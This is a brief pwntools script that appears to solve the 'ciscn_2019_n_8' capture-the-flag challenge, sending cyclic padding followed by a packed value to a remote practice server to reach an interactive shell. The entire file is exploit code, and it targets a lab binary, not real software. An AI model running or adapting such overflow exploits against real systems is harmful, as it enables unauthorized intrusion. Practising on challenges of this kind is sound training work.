from pwn import *

#io = process('ciscn_2019_n_8')
io = remote('node4.buuoj.cn',26604)
payload = cyclic(13*4) + p64(17)

io.recv()
io.sendline(payload)
io.interactive()
